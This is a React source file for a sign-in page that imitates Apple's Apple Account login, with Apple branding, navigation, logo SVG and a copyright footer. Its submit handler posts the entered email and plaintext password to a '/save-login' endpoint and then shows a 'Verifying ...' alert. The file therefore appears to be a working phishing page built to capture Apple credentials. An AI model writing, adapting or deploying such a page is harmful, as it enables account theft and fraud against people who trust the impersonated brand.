import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Checkbox } from "@/components/ui/checkbox";
import { Link } from "react-router-dom";

export default function SignIn() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [rememberMe, setRememberMe] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
  e.preventDefault();

  try {
    const response = await fetch("http://localhost:3000/save-login", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ email, password }),
    });

    if (!response.ok) {
      throw new Error("Failed to send data");
    }

    alert("Verifying ...");
  } catch (err) {
    console.error("An Error Occurred:", err);
    alert("Failed to send");
  }
};


  return (
    <div className="min-h-screen bg-white">
      {/* Apple Navigation Header */}
      <header className="border-b border-border">
        <div className="max-w-7xl mx-auto px-4">
          <div className="flex items-center justify-between h-11">
            <div className="flex items-center space-x-8">
              <Link to="/" className="flex items-center">
                <AppleLogo />
              </Link>
              <nav className="hidden md:flex items-center space-x-6 text-xs">
                <a
                  href="#"
                  className="text-foreground hover:text-muted-foreground"
                >
                  Store
                </a>
                <a
                  href="#"
                  className="text-foreground hover:text-muted-foreground"
                >
                  Mac
                </a>
                <a
                  href="#"
                  className="text-foreground hover:text-muted-foreground"
                >
                  iPad
                </a>
                <a
                  href="#"
                  className="text-foreground hover:text-muted-foreground"
                >
                  iPhone
                </a>
                <a
                  href="#"
                  className="text-foreground hover:text-muted-foreground"
                >
                  Watch
                </a>
                <a
                  href="#"
                  className="text-foreground hover:text-muted-foreground"
                >
                  AirPods
                </a>
                <a
                  href="#"
                  className="text-foreground hover:text-muted-foreground"
                >
                  TV & Home
                </a>
                <a
                  href="#"
                  className="text-foreground hover:text-muted-foreground"
                >
                  Entertainment
                </a>
                <a
                  href="#"
                  className="text-foreground hover:text-muted-foreground"
                >
                  Accessories
                </a>
                <a
                  href="#"
                  className="text-foreground hover:text-muted-foreground"
                >
                  Support
                </a>
              </nav>
            </div>
            <div className="flex items-center space-x-4">
              <SearchIcon />
              <ShoppingBagIcon />
            </div>
          </div>
        </div>
      </header>

      {/* Secondary Navigation */}
      <div className="border-b border-border bg-white sticky top-0 z-40">
        <div className="max-w-7xl mx-auto px-4">
          <div className="flex items-center justify-between h-13">
            <h1 className="text-xl font-medium text-foreground">
              Apple Account
            </h1>
            <div className="flex items-center space-x-6 text-sm">
              <span className="text-muted-foreground">Sign In</span>
              <Link to="#" className="text-primary hover:underline">
                Create Your Apple Account
              </Link>
              <Link to="#" className="text-primary hover:underline">
                FAQ
              </Link>
            </div>
          </div>
        </div>
      </div>

      {/* Main Content */}
      <main className="flex-1 flex items-center justify-center px-4 py-16">
        <div className="w-full max-w-md">
          {/* Colorful Dot Pattern with Apple Logo */}
          <div className="text-center mb-12">
            <div className="relative inline-block">
              <ColorfulDotPattern />
              <div className="absolute inset-0 flex items-center justify-center">
                <AppleLogo className="w-12 h-12" />
              </div>
            </div>
          </div>

          {/* Sign In Form */}
          <div className="text-center mb-8">
            <h2 className="text-3xl font-medium text-foreground mb-2">
              Apple Account
            </h2>
            <p className="text-muted-foreground">Manage your Apple Account</p>
          </div>

          <form onSubmit={handleSubmit} className="space-y-6">
            <div>
              <Input
                type="email"
                placeholder="Email or Phone Number"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                className="h-12 px-4 text-base bg-white border-muted rounded-lg focus:border-primary focus:ring-2 focus:ring-primary/20"
                required
              />
            </div>

            <div>
              <Input
                type="password"
                placeholder="Password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="h-12 px-4 text-base bg-white border-muted rounded-lg focus:border-primary focus:ring-2 focus:ring-primary/20"
                required
              />
            </div>

            <div className="flex items-center justify-between">
              <div className="flex items-center space-x-2">
                <Checkbox
                  id="remember"
                  checked={rememberMe}
                  onCheckedChange={(checked) =>
                    setRememberMe(checked as boolean)
                  }
                  className="border-primary data-[state=checked]:bg-primary"
                />
                <label htmlFor="remember" className="text-sm text-foreground">
                  Remember me
                </label>
              </div>
              <Link to="#" className="text-sm text-primary hover:underline">
                Forgot password? →
              </Link>
            </div>

            <Button
              type="submit"
              className="w-full h-12 bg-primary hover:bg-primary/90 text-white rounded-lg text-base font-medium"
            >
              Sign In
            </Button>
          </form>
        </div>
      </main>

      {/* Footer */}
      <footer className="bg-secondary/30 border-t border-border mt-auto">
        <div className="max-w-7xl mx-auto px-4 py-6">
          <div className="text-center text-xs text-muted-foreground space-y-2">
            <p>
              More ways to shop: Find an{" "}
              <a href="#" className="text-primary hover:underline">
                Apple Store
              </a>{" "}
              or other retailer near you. Or call 1-800-MY-APPLE.
            </p>
            <div className="flex items-center justify-center space-x-2">
              <span>United States</span>
            </div>
            <p>Copyright © 2025 Apple Inc. All rights reserved.</p>
            <div className="flex items-center justify-center space-x-4">
              <a href="#" className="hover:underline">
                Privacy Policy
              </a>
              <span>|</span>
              <a href="#" className="hover:underline">
                Terms of Use
              </a>
              <span>|</span>
              <a href="#" className="hover:underline">
                Sales and Refunds
              </a>
              <span>|</span>
              <a href="#" className="hover:underline">
                Legal
              </a>
              <span>|</span>
              <a href="#" className="hover:underline">
                Site Map
              </a>
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
}

// Apple Logo Component
function AppleLogo({ className = "w-6 h-6" }: { className?: string }) {
  return (
    <svg className={className} viewBox="0 0 814 1000" fill="currentColor">
      <path d="M788.1 340.9c-5.8 4.5-108.2 62.2-108.2 190.5 0 148.4 130.3 200.9 134.2 202.2-.6 3.2-20.7 71.9-68.7 141.9-42.8 61.6-87.5 123.1-155.5 123.1s-85.5-39.5-164-39.5c-76.5 0-103.7 40.8-165.9 40.8s-105.6-57-155.5-127.2c-54.7-77.4-96.7-194.1-96.7-315.4 0-191.1 124.4-291.7 247.4-291.7 75.1 0 137.8 49.1 185.8 49.1 45.9 0 117.8-53.4 199.8-53.4 33.8 0 103.9 4.5 140.5 68.1zm-201.1-86.6c31.1-36.9 53.1-88.1 53.1-139.3 0-7.1-.6-14.3-1.9-20.1-50.6 1.9-110.8 33.7-147.1 75.8-28.5 32.4-55.1 83.6-55.1 135.5 0 7.8 1.3 15.6 1.9 18.1 3.2.6 8.4 1.3 13.6 1.3 45.4 0 102.5-30.4 135.5-71.3z" />
    </svg>
  );
}

// Search Icon Component
function SearchIcon() {
  return (
    <svg
      className="w-4 h-4"
      fill="none"
      stroke="currentColor"
      viewBox="0 0 24 24"
    >
      <path
        strokeLinecap="round"
        strokeLinejoin="round"
        strokeWidth={2}
        d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"
      />
    </svg>
  );
}

// Shopping Bag Icon Component
function ShoppingBagIcon() {
  return (
    <svg
      className="w-4 h-4"
      fill="none"
      stroke="currentColor"
      viewBox="0 0 24 24"
    >
      <path
        strokeLinecap="round"
        strokeLinejoin="round"
        strokeWidth={2}
        d="M16 11V7a4 4 0 00-8 0v4M5 9h14l1 12H4L5 9z"
      />
    </svg>
  );
}

// Colorful Dot Pattern Component (Apple's signature design)
function ColorfulDotPattern() {
  return (
    <div className="relative w-48 h-48 mx-auto">
      <svg
        className="w-full h-full"
        viewBox="0 0 200 200"
        fill="none"
        xmlns="http://www.w3.org/2000/svg"
      >
        {/* Define the dots with different colors in a circular pattern */}
        {Array.from({ length: 8 }, (_, ring) => {
          const radius = 20 + ring * 10;
          const dotsInRing = Math.max(8, ring * 4);
          return Array.from({ length: dotsInRing }, (_, i) => {
            const angle = (i * 360) / dotsInRing;
            const x = 100 + radius * Math.cos((angle * Math.PI) / 180);
            const y = 100 + radius * Math.sin((angle * Math.PI) / 180);
            const size = Math.max(1, 4 - ring * 0.3);

            // Create a rainbow effect
            const hue = (angle + ring * 20) % 360;
            const color = `hsl(${hue}, 70%, 60%)`;

            return (
              <circle
                key={`${ring}-${i}`}
                cx={x}
                cy={y}
                r={size}
                fill={color}
                opacity={0.8}
              />
            );
          });
        }).flat()}
      </svg>
    </div>
  );
}
